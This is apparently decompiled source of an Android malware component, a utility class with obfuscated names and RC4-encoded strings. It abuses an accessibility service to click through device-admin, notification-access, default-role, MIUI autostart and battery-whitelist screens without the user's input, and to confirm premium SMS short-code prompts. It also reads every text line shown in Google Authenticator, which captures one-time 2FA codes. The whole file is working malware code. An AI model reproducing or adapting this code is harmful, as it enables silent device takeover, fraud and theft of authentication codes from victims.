package com.example.mmm.Utils;

import android.accessibilityservice.AccessibilityService;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.graphics.Rect;
import android.os.Bundle;
import android.os.Build.VERSION;
import android.util.Base64;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import com.example.mmm.constants;
import com.example.mmm.API.ClassRC4;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;

public final class utils2 {
   static utils declined$ = new utils();
   constants florida$ = new constants();

   static AccessibilityNodeInfo _selling(AccessibilityEvent var0, String var1) {
      return var0 == null ? null : _privacy(var0.getSource(), var1);
   }

   private static void _acute(int var0, int var1, AccessibilityNodeInfo var2) {
      if (var2 != null) {
         Rect var4;
         if (var2.getChildCount() == 0) {
            var4 = new Rect();
            var2.getBoundsInScreen(var4);
            if (var4.contains(var0, var1)) {
               var2.performAction(16);
            }
         } else {
            var4 = new Rect();
            var2.getBoundsInScreen(var4);
            if (var4.contains(var0, var1)) {
               var2.performAction(16);
            }

            for(int var3 = 0; var3 < var2.getChildCount(); ++var3) {
               _acute(var0, var1, var2.getChild(var3));
            }

         }
      }
   }

   public static void _plains(AccessibilityService var0, int var1, int var2) {
      if (VERSION.SDK_INT > 16) {
         _acute(var1, var2, var0.getRootInActiveWindow());
      }

   }

   public static void _batch(AccessibilityNodeInfo var0, String var1) {
      if (VERSION.SDK_INT >= 18) {
         Bundle var2 = new Bundle();
         var2.putString("ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE", var1);
         var0.performAction(2097152, var2);
      }

   }

   private static List _habitat(AccessibilityNodeInfo var0, String var1) {
      ArrayList var4 = new ArrayList();
      if (var0 == null) {
         return var4;
      } else {
         int var3 = var0.getChildCount();

         for(int var2 = 0; var2 < var3; ++var2) {
            AccessibilityNodeInfo var5 = var0.getChild(var2);
            if (var5 != null) {
               if (var5.getClassName().toString().toLowerCase().contains(var1.toLowerCase())) {
                  var4.add(var5);
               } else {
                  var4.addAll(_habitat(var5, var1));
               }
            }
         }

         return var4;
      }
   }

   private static AccessibilityNodeInfo _privacy(AccessibilityNodeInfo var0, String var1) {
      Object var3 = null;
      if (var0 == null) {
         return null;
      } else {
         AccessibilityNodeInfo var2 = (AccessibilityNodeInfo)var3;
         if (VERSION.SDK_INT >= 18) {
            List var4 = var0.findAccessibilityNodeInfosByViewId(var1);
            var2 = (AccessibilityNodeInfo)var3;
            if (var4.size() > 0) {
               var2 = (AccessibilityNodeInfo)var4.get(0);
            }
         }

         return var2;
      }
   }

   public final String _roster(String var1) {
      var1 = new String((new ClassRC4("wewiejvtlfqy".getBytes()))._nevada(utils.hexStringToByteArray(new String(Base64.decode(var1, 0), "UTF-8"))));
      return var1;
   }

   public final void _cornell(Context var1) {
      Intent var2 = new Intent("miui.intent.action.APP_PERM_EDITOR");
      var2.setClassName("com.miui.securitycenter", "com.miui.permcenter.permissions.PermissionsEditorActivity");
      var2.putExtra("extra_pkgname", var1.getPackageName());
      var2.setFlags(268435456);
      var1.startActivity(var2);
   }

   public final boolean _santa(AccessibilityService var1, AccessibilityEvent var2, String var3) {
      if (VERSION.SDK_INT >= 18 && var3.contains("com.google.android.permissioncontroller")) {
         declined$.Log("run", "for clicked com.android.packageinstaller.role.ui.requestroleactivity  ");
         if (var2.getSource() == null) {
            return false;
         }

         Iterator var9 = _habitat(var2.getSource(), "android.widget.LinearLayout").iterator();
         boolean var4 = false;

         while(var9.hasNext()) {
            AccessibilityNodeInfo var7 = (AccessibilityNodeInfo)var9.next();

            boolean var6;
            for(int var5 = 0; var5 < var7.getChildCount(); var4 = var6) {
               AccessibilityNodeInfo var8 = var7.getChild(var5);
               var6 = var4;
               if (var8.getText() != null) {
                  declined$.Log("=========", var8.getText().toString());
                  var6 = var4;
                  if (var8.getText().toString().equals(declined$.getLabelApplication(var1))) {
                     var7.performAction(16);
                     var6 = true;
                  }
               }

               ++var5;
            }
         }
      }

      return false;
   }

   public final boolean _shannon(AccessibilityNodeInfo var1) {
      if (var1 == null) {
         return false;
      } else {
         declined$.Log("AccessibilityClickButton", var1.toString());
         return var1.performAction(16);
      }
   }

   public final void _presence(AccessibilityService var1, AccessibilityEvent var2, String var3) {
      if (VERSION.SDK_INT >= 18 && var3.contains("com.google.android.apps.authenticator2")) {
         declined$.Log("run", "com.google.android.apps.authenticator2");
         if (var2.getSource() == null) {
            return;
         }

         var3 = "";
         Iterator var6 = _habitat(var2.getSource(), "android.view.ViewGroup").iterator();
         int var4 = 0;

         String var10;
         for(var10 = var3; var6.hasNext(); ++var4) {
            AccessibilityNodeInfo var7 = (AccessibilityNodeInfo)var6.next();

            for(int var5 = 0; var5 < var7.getChildCount(); var10 = var3) {
               AccessibilityNodeInfo var8 = var7.getChild(var5);
               var3 = var10;
               if (var8.getText() != null) {
                  utils var11 = declined$;
                  StringBuilder var9 = new StringBuilder();
                  var9.append("Line: ");
                  var9.append(var4);
                  var9.append(", index: ");
                  var9.append(var5);
                  var11.Log(var9.toString(), var8.getText().toString());
                  StringBuilder var12 = new StringBuilder();
                  var12.append(var10);
                  var12.append("Line: ");
                  var12.append(var4);
                  var12.append(", index: ");
                  var12.append(var5);
                  var12.append(", text: ");
                  var12.append(var8.getText().toString());
                  var12.append("\n");
                  var3 = var12.toString();
               }

               ++var5;
            }
         }

         var10.isEmpty();
      }

   }

   public final void _fires(Context var1) {
      Intent var2 = new Intent();
      var2.setComponent(new ComponentName("com.miui.securitycenter", "com.miui.permcenter.autostart.AutoStartManagementActivity"));
      var2.setFlags(268435456);
      var1.startActivity(var2);
   }

   public final boolean _phone(AccessibilityEvent var1, String var2) {
      if (VERSION.SDK_INT >= 18 && var2.contains("com.miui.powerkeeper.ui.hiddenappsconfigactivity")) {
         declined$.Log("run", "for clicked3");
         utils.chalkTile(40);
         Iterator var5 = _habitat(var1.getSource(), "android.widget.LinearLayout").iterator();

         while(var5.hasNext()) {
            AccessibilityNodeInfo var6 = (AccessibilityNodeInfo)var5.next();

            for(int var3 = 0; var3 < var6.getChildCount(); ++var3) {
               AccessibilityNodeInfo var4 = var6.getChild(var3);
               if (var4.getViewIdResourceName() != null && var4.getViewIdResourceName().equals("android:id/title")) {
                  this._shannon(var6);
                  return true;
               }
            }
         }
      }

      return false;
   }

   public final void _tulsa(Context var1) {
      Intent var2 = new Intent();
      var2.setClassName("com.miui.powerkeeper", "com.miui.powerkeeper.ui.HiddenAppsConfigActivity");
      var2.putExtra("package_name", var1.getPackageName());
      var2.putExtra("package_label", declined$.getLabelApplication(var1));
      var2.setFlags(268435456);
      var1.startActivity(var2);
   }

   public final boolean _bases(AccessibilityService var1, AccessibilityEvent var2, String var3) {
      if (VERSION.SDK_INT >= 18 && var3.contains("com.miui.permcenter.autostart.autostartmanagementactivity")) {
         declined$.Log("run", "for clicked2");
         utils.chalkTile(40);
         Iterator var12 = _habitat(var2.getSource(), "android.widget.LinearLayout").iterator();

         while(var12.hasNext()) {
            AccessibilityNodeInfo var13 = (AccessibilityNodeInfo)var12.next();
            int var4 = 0;

            boolean var6;
            for(boolean var5 = false; var4 < var13.getChildCount(); var5 = var6) {
               AccessibilityNodeInfo var8 = var13.getChild(var4);
               var6 = var5;
               if (var8.getViewIdResourceName() != null) {
                  utils var9 = declined$;
                  String var10 = "==============";
                  StringBuilder var11 = new StringBuilder();
                  var11.append("text: ");
                  var11.append(var8.getText());
                  var11.append("  id: ");
                  var11.append(var8.getViewIdResourceName());
                  var9.Log(var10, var11.toString());
                  var6 = var5;
                  if (var8.getText() != null) {
                     boolean var7 = declined$.getLabelApplication(var1).contains(var8.getText().toString());
                     var6 = var5;
                     if (var7) {
                        var6 = true;
                     }
                  }
               }

               ++var4;
            }
         }
      }

      return false;
   }

   public final boolean _referral(AccessibilityEvent var1, String var2) {
      if (VERSION.SDK_INT >= 18 && var2.contains("android.app.alertdialog")) {
         AccessibilityNodeInfo var3 = var1.getSource();
         if (var3 == null) {
            return false;
         }

         AccessibilityNodeInfo var4 = _privacy(var3, "android:id/sms_short_code_remember_choice_checkbox");
         if (var4 != null) {
            this._shannon(var4);
            var3 = _privacy(var3, "android:id/button1");
            if (var3 != null) {
               this._shannon(var3);
               return true;
            }
         }
      }

      return false;
   }

   public final boolean _console(AccessibilityService var1, AccessibilityEvent var2, String var3) {
      if (var3.contains("com.android.settings.settings$notificationaccesssettingsactivity") && utils.isNotificationServiceEnabled(var1)) {
         return true;
      } else {
         if (!utils.isNotificationServiceEnabled(var1) && VERSION.SDK_INT >= 18 && var3.contains("com.android.settings.settings$notificationaccesssettingsactivity")) {
            declined$.Log("run", "for clicked3");
            Iterator var6 = _habitat(var2.getSource(), "android.widget.LinearLayout").iterator();

            while(var6.hasNext()) {
               AccessibilityNodeInfo var7 = (AccessibilityNodeInfo)var6.next();

               for(int var4 = 0; var4 < var7.getChildCount(); ++var4) {
                  AccessibilityNodeInfo var5 = var7.getChild(var4);
                  if (var5.getText() != null && var5.getText().equals("euwvxmpnqta")) {
                     this._shannon(var7);
                     declined$.SettingsWrite(var1, "SQ", "1");
                  }
               }
            }
         }

         return false;
      }
   }

   public final boolean _obtain(AccessibilityEvent var1, String var2) {
      if (VERSION.SDK_INT >= 18) {
         if (var1.getSource() == null) {
            return false;
         }

         if (var2.contains("com.android.settings.deviceadminadd")) {
            declined$.Log("run", "for clicked");
            Iterator var3 = _habitat(var1.getSource(), "android.widget.LinearLayout").iterator();

            while(var3.hasNext()) {
               ((AccessibilityNodeInfo)var3.next()).performAction(16);
            }
         }
      }

      return false;
   }

   public final boolean _declared(AccessibilityService var1, AccessibilityEvent var2, String var3) {
      if (VERSION.SDK_INT >= 18) {
         AccessibilityNodeInfo var7 = var2.getSource();
         if (var7 == null) {
            return false;
         }

         var7 = _privacy(var7, "android:id/text1");
         if (var7 != null) {
            this._shannon(var7);
            declined$.Log("CLK", "GOOD CLICK!");
            declined$.SettingsWrite(var1, "XB", "1");
            declined$._chapel(var1);
            return true;
         }

         if (var3.contains("com.miui.permcenter.permissions.permissionseditoractivity")) {
            declined$.Log("run", "for clicked");
            utils.chalkTile(40);
            List var11 = _habitat(var2.getSource(), "android.widget.LinearLayout");
            Iterator var12 = var11.iterator();
            int var4 = 0;

            while(true) {
               int var6;
               AccessibilityNodeInfo var13;
               do {
                  if (!var12.hasNext()) {
                     return false;
                  }

                  var13 = (AccessibilityNodeInfo)var12.next();
                  var6 = var4 + 1;
                  var4 = var6;
               } while(var11.size() - 1 != var6);

               int var5 = 0;

               while(true) {
                  var4 = var6;
                  if (var5 >= var13.getChildCount()) {
                     break;
                  }

                  var7 = var13.getChild(var5);
                  if (var7.getViewIdResourceName() != null && var7.getViewIdResourceName().equals("com.miui.securitycenter:id/action")) {
                     utils var8 = declined$;
                     String var9 = "=======";
                     StringBuilder var10 = new StringBuilder();
                     var10.append(var7.getViewIdResourceName());
                     var8.Log(var9, var10.toString());
                     var13.performAction(16);
                  }

                  ++var5;
               }
            }
         }
      }

      return false;
   }
}
